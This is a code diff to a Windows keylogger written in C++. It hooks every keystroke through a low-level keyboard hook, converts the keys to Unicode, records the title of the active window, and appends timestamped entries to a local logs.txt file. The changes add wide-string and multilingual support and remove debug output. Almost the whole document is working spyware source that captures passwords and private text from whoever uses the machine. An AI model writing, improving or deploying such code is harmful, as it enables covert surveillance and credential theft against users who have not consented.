@@ -7,149 +7,138 @@
 #include <ctime>
 #include <chrono>
 
+/* g_prevWindow is called globally because there is not way to pass it the hook callback function as an argument and is need to update the log file */
 
-std::string g_prevWindow;
+std::wstring g_prevWindow;
 
-/* getDate() is called on each log, it uses sprintf to easily get the format we want [DD-MM-YYYY HH:MM:SS] */
+/* getDate() is called on each log, it uses sprintf to easily get the format we want [DD-MM-YYYY HH:MM:SS], returns a wide string to be written in wide ofstream */
 
-std::string getDate() {
+std::wstring getDate() {
 	struct tm* timeinfo;
-	char timestr[21];
+	wchar_t timestr[21];
 	time_t rawtime;
 
 	time(&rawtime);
-	//std::cout << time(NULL) << std::endl;
 	timeinfo = localtime(&rawtime);
-	//std::cout << timeinfo->tm_mday << std::endl;
-	//fprintf??
-	sprintf(timestr, "[%02d-%02d-%d %02d:%02d:%02d]", timeinfo->tm_mday, timeinfo->tm_mon + 1, timeinfo->tm_year + 1900, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
+	swprintf(timestr, L"[%02d-%02d-%d %02d:%02d:%02d]", timeinfo->tm_mday, timeinfo->tm_mon + 1, timeinfo->tm_year + 1900, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
 	return (timestr);
 }
 
-/* getWindowTitle() is also called on each log, it gets the the foreground process ID then calls GetWindowText to get the window title*/
+/* getWindowTitle() is also called on each log, it gets the the foreground process ID then calls GetWindowText to get the window title, returns a wide string to be written in wide ofstream */
 
-std::string getWindowTitle(){
+std::wstring getWindowTitle(){
 	HWND fgw = GetForegroundWindow();
-	char windowtitle[256];
+	wchar_t windowtitle[256];
 
-	GetWindowText(fgw, windowtitle, sizeof(windowtitle));
-	//std::cout << "{{" << fgw << "}}";
-	return windowtitle;
+	GetWindowTextW(fgw, windowtitle, sizeof(windowtitle));
+	return (windowtitle);
 }
 
-/* Write the date, window title and buffer content to the logfile */
+/* writeLogs() Writes the date, window title and buffer content to the logfile.
+the local needs to be associated with imbue() to the wide file stream in order to write any unicode to the file */
 
-void writeLogs(std::string buf, std::string windowTitle) {
-	std::fstream logfile;
+void writeLogs(std::wstring buf, std::wstring windowTitle) {
+	const std::locale utf8_locale = std::locale("en_US.UTF-8");
+	std::wofstream logfile;
 
 	logfile.open("logs.txt", std::ios::app);
-	std::cout << "||||WRITING TO FILE||||";
+	logfile.imbue(utf8_locale);
 	logfile << getDate();
-	logfile << " - '";
+	logfile << " - \'";
 	logfile << windowTitle;
 	logfile << "' - ";
 	logfile << buf << std::endl;
 	logfile.close();
 }
 
-/* TranslateKeys() is called on each keypress and simply converts the key press from VK_code to a writable character */
+/* TranslateKeys() is called on each keypress and simply converts the key press from vkCode to a writable character
+-if vkCode == special key: returns a descriptive wstring for that key.
+-else ToUnicodeEx() is called to return the proper unicode to handle all languages and special characters.*/
 
-std::string translateKeys(int key){
-	std::string result;
-	if (key == VK_SPACE)
-		result = " ";
-	else if (key == VK_RETURN)
-		result = "\n";
-	else if (key == VK_BACK)
-		result = "[DEL]";
-	else if (key == VK_TAB)
-		result = "\t";
-	else if (key == VK_LSHIFT || key == VK_RSHIFT)
-		result = "[SHIFT]";
-	else if (key == VK_LCONTROL || key == VK_RCONTROL)
-		result = "[CTRL]";
-	else if (key == VK_MENU)
-		result = "[ALT]";
-	else if (key == VK_CAPITAL)
-		result = "[CAPS]";
-	else if (key == VK_ESCAPE)
-		result = "[ESC]";
-	else if (key == VK_LEFT)
-		result = "[LEFT ARROW]";
-	else if (key == VK_RIGHT)
-		result = "[RIGHT ARROW]";
-	else if (key == VK_UP)
-		result = "[UP ARROW]";
-	else if (key == VK_DOWN)
-		result = "[DOWN ARROW]";
-	else if (key == VK_SNAPSHOT)
-		result = "[PRINT SCREEN]";
-	else if (key == VK_NUMLOCK)
-		result = "[NUMLOCK]";
-	else if (key == VK_LWIN)
-		result = "[WINDOWS]";
-	else if (key == 255)
-		result = "[FN]";
-	else if (key >= 112 && key <=120){
-		result = "[F";
-		result += key-63; // 112-63=49(ascii for '1');		
+std::wstring translateKeys(DWORD vkCode, DWORD scanCode){
+	std::wstring result;
+
+	if (vkCode == VK_SPACE)
+		result = L" ";
+	else if (vkCode == VK_RETURN)
+		result = L"\n";
+	else if (vkCode == VK_BACK)
+		result = L"[DEL]";
+	else if (vkCode == VK_TAB)
+		result = L"\t";
+	else if (vkCode == VK_LSHIFT || vkCode == VK_RSHIFT)
+		result = L"[SHIFT]";
+	else if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL)
+		result = L"[CTRL]";
+	else if (vkCode == VK_MENU)
+		result = L"[ALT]";
+	else if (vkCode == VK_CAPITAL)
+		result = L"[CAPS]";
+	else if (vkCode == VK_ESCAPE)
+		result = L"[ESC]";
+	else if (vkCode == VK_LEFT)
+		result = L"[LEFT ARROW]";
+	else if (vkCode == VK_RIGHT)
+		result = L"[RIGHT ARROW]";
+	else if (vkCode == VK_UP)
+		result = L"[UP ARROW]";
+	else if (vkCode == VK_DOWN)
+		result = L"[DOWN ARROW]";
+	else if (vkCode == VK_SNAPSHOT)
+		result = L"[PRINT SCREEN]";
+	else if (vkCode == VK_NUMLOCK)
+		result = L"[NUMLOCK]";
+	else if (vkCode == VK_LWIN)
+		result = L"[WINDOWS]";
+	else if (vkCode == 255)
+		result = L"[FN]";
+	else if (vkCode >= 112 && vkCode <=120){
+		result = L"[F";
+		result += (wchar_t)vkCode-63; // 112-63=49(ascii for '1');		
 		result += ']';
 	}
-	else if (key == 121)
-		result = "[F10]";
-	else if (key == 122)
-		result = "[F11]";
-	else if (key == 123)
-		result = "[F12]";
-	//12!@#$
-	//Now french &é"'(-è_çà)=
-	else{//we use the following line to get wScanCode to pass to "ToUnicodeEx()" from MSDN, this function takes a VK_KEY and a flag to specify the type of conversion 
+	else if (vkCode == 121)
+		result = L"[F10]";
+	else if (vkCode == 122)
+		result = L"[F11]";
+	else if (vkCode == 123)
+		result = L"[F12]";
+	else{
 		HWND hForegroundProcess = GetForegroundWindow();
-		BYTE lpKeyState[256];
-		wchar_t buff[5];
-		//WORD buff[5];
-		//LPDWORD lpdwProcessId;
-		DWORD lpdwProcessId;
-		DWORD dwThreadID = GetWindowThreadProcessId(hForegroundProcess, &lpdwProcessId);
+		BYTE lpKeyState[256] = {0};
+		wchar_t buff[2];
+		DWORD dwThreadID = GetWindowThreadProcessId(hForegroundProcess, NULL);
 		HKL keyboardLayout = GetKeyboardLayout(dwThreadID);
-		UINT wScanCode = MapVirtualKeyEx(key, MAPVK_VK_TO_VSC, keyboardLayout);
 		GetKeyState(VK_SHIFT);
         GetKeyState(VK_MENU);
 		if (GetKeyboardState(lpKeyState) == 0){
-			std::cout << "!!!!!!!! ERROR IN KEYBOARD STATE" << std::endl;
+			std::cout << "!!!!!!!! ERROR IN KEYBOARD STATE" << std::endl; // add proper error handling here
 		}
-		int ret = ToUnicodeEx(key, wScanCode, lpKeyState, buff, 5, 0, keyboardLayout); //
-		//int ret = ToAsciiEx(key, wScanCode, lpKeyState, buff, 0, keyboardLayout);
-		std::cout << "ToUnicodeEx ret" << ret << std::endl; 
+		int ret = ToUnicodeEx(vkCode, scanCode, lpKeyState, buff, 2, 0, keyboardLayout);
 		result += buff[0];
-		std::wcout << "BUFFFFFFFFFFFERs: " << buff << std::endl;
-		printf("{{{%c}}}key : %d, char : %c\n", result[0], key, MapVirtualKeyEx(key, MAPVK_VK_TO_CHAR
-, keyboardLayout));
 	}
-	// add shift and caps lock statements later
-	//printLocale();
 	return result;
 }
 
+/* The CallBack function needed by SetWindowsHookEx to handle the low-level keyboard hooks */
+
 LRESULT CALLBACK keyboardHook(int code, WPARAM wParam, LPARAM lParam){
-    KBDLLHOOKSTRUCT *s = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
-    std::string finalChar;
-	std::string buf;
-	std::string currentWindow;
+    KBDLLHOOKSTRUCT *s = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
+    std::wstring finalChar;
+	static std::wstring buf; // static to no reset after each keyboardHook call
+	std::wstring currentWindow;
 
     if (wParam == WM_KEYDOWN){
-        finalChar = translateKeys(s->vkCode);
-		// for some fucking reason this doesn't append
-        buf += finalChar;
-        printf("<<final char: %s, buf: %s, cat: >>\n", finalChar.data());
 		currentWindow = getWindowTitle();
-		printf("@@BUF LENGTH %d@@", buf.length());
-        if (buf.length() >= 100 || (currentWindow != g_prevWindow && buf.length() > 0))
+		// NEED TO FIX: first time program enters it prints 1 char
+		if (buf.length() >= 100 || (currentWindow != g_prevWindow && buf.length() > 0))
 				{
 					writeLogs(buf, g_prevWindow);
 					buf.clear();
 					g_prevWindow = currentWindow;
 				}
+        finalChar = translateKeys(s->vkCode, s->scanCode);
+        buf += finalChar;
     }
 
     return CallNextHookEx(NULL, code, wParam, lParam);
@@ -168,5 +157,3 @@ void main() {
     }
     UnhookWindowsHookEx(keyboard);
 }
-
-//qwqwqwazer&é"'ééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééééé
